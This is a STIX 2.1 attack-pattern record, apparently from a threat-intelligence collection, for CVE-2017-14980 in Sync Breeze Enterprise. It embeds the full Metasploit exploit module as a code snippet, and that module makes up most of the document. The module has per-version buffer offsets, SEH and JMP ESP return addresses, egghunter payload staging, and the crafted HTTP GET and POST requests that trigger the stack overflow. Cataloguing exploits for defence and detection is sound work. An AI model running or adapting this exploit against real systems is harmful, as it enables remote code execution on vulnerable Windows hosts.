{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9e49bab9-6531-4ffe-9288-717f72b5be39",
    "created": "2024-08-14T16:53:46.491059Z",
    "modified": "2024-08-14T16:53:46.491063Z",
    "name": "Sync Breeze Enterprise GET Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow vulnerability in the web interface of Sync Breeze Enterprise v9.4.28, v10.0.28 and v10.1.16, caused by improper bounds checking of the request in HTTP GET and POST requests sent to the built-in web server. This module has been tested successfully on Windows 7 SP1 x86.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/syncbreeze_bof.rb",
            "external_id": "syncbreeze_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-14980"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::Seh\n  include Msf::Exploit::Remote::Egghunter\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Sync Breeze Enterprise GET Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack-based buffer overflow vulnerability\n        in the web interface of Sync Breeze Enterprise v9.4.28, v10.0.28,\n        and v10.1.16, caused by improper bounds checking of the request in\n        HTTP GET and POST requests sent to the built-in web server. This\n        module has been tested successfully on Windows 7 SP1 x86.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Daniel Teixeira',\n          'Andrew Smith',             # MSF support for v10.0.28\n          'Owais Mehtab',             # Original v10.0.28 exploit\n          'Milton Valencia (wetw0rk)' # MSF support for v10.1.16\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'BadChars'   => \"\\x00\\x09\\x0a\\x0d\\x20\\x26\",\n          'Space'      => 500\n        },\n      'References'     =>\n        [\n          [ 'CVE', '2017-14980' ],\n        ],\n      'Targets'        =>\n        [\n          [\n            'Automatic', {}\n          ],\n          [ 'Sync Breeze Enterprise v9.4.28',\n            {\n              'Offset' => 2488,\n              'Ret'    => 0x10015fde  # POP # POP # RET [libspp.dll]\n            }\n          ],\n          [ 'Sync Breeze Enterprise v10.0.28',\n            {\n              'Offset' => 780,\n              'Ret'    => 0x10090c83  # JMP ESP [libspp.dll]\n            }\n          ],\n          [ 'Sync Breeze Enterprise v10.1.16',\n            {\n              'Offset' => 2495,\n              'Ret'    => 0x1001C65C # POP # POP # RET [libspp.dll]\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2017-03-15',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_product_name\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/'\n    )\n\n    if res && res.code == 200\n      product_name = res.body.scan(/(Sync Breeze Enterprise v[^<]*)/i).flatten.first\n      return product_name if product_name\n    end\n\n    nil\n  end\n\n  def check\n    product_name = get_product_name\n    return Exploit::CheckCode::Unknown unless product_name\n\n    if product_name =~ /9\\.4\\.28/ || product_name =~ /10\\.0\\.28/\n      return Exploit::CheckCode::Appears\n    elsif product_name =~ /Sync Breeze Enterprise/\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def get_target_name\n    if target.name != 'Automatic'\n      print_status(\"Target manually set as #{target.name}\")\n      return target\n    else\n      print_status('Automatically detecting target...')\n    end\n\n    case get_product_name\n    when /9\\.4\\.28/\n      print_status('Target is 9.4.28')\n      return targets[1]\n    when /10\\.0\\.28/\n      print_status('Target is 10.0.28')\n      return targets[2]\n    when /10\\.1\\.16/\n      print_status('Target is 10.1.16')\n      return targets[3]\n    else\n      nil\n    end\n  end\n\n  def exploit\n    tmp_target = target\n    case get_target_name\n    when targets[1]\n      target = targets[1]\n      eggoptions = {\n        checksum: true,\n        eggtag: rand_text_alpha(4, payload_badchars)\n      }\n\n      hunter, egg = generate_egghunter(\n        payload.encoded,\n        payload_badchars,\n        eggoptions\n      )\n\n      sploit =  rand_text_alpha(target['Offset'])\n      sploit << generate_seh_record(target.ret)\n      sploit << hunter\n      sploit << make_nops(10)\n      sploit << egg\n      sploit << rand_text_alpha(5500)\n\n      print_status('Sending request...')\n\n      send_request_cgi(\n        'method' => 'GET',\n        'uri'    => sploit\n      )\n\n    when targets[2]\n      target = targets[2]\n      uri = \"/login\"\n      sploit = rand_text_alpha(target['Offset'])\n      sploit << [target.ret].pack('V')\n      sploit << rand_text(4)\n      make_nops(10)\n      sploit << payload.encoded\n\n      print_status('Sending request...')\n\n      send_request_cgi(\n        'method' => 'POST',\n        'uri'    => uri,\n        'vars_post'     => {\n          'username' => \"#{sploit}\",\n          'password' => \"rawr\"\n        }\n      )\n    when targets[3]\n      target = targets[3]\n\n      eggoptions = {\n        checksum: true,\n        eggtag: rand_text_alpha(4, payload_badchars)\n      }\n\n      hunter, egg = generate_egghunter(\n        payload.encoded,\n        payload_badchars,\n        eggoptions\n      )\n\n      sploit = payload.encoded\n      sploit << rand_text_alpha(target['Offset'] - payload.encoded.length, payload_badchars)\n      sploit << generate_seh_record(target.ret)\n      sploit << hunter\n      # Push the payload out of this buffer, which will make the hunter look for the payload\n      # somewhere else that has the complete payload.\n      sploit << make_nops(200)\n      sploit << egg\n      sploit << rand_text_alpha(9067 - sploit.length, payload_badchars)\n\n      send_request_cgi(\n        'uri'    =>  \"/#{sploit}\",\n        'method' =>  'GET'\n      )\n    else\n      print_error(\"Exploit not suitable for this target.\")\n    end\n  ensure\n    target = tmp_target\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-03-15",
    "x_mitre_platforms": [
        "win'"
    ]
}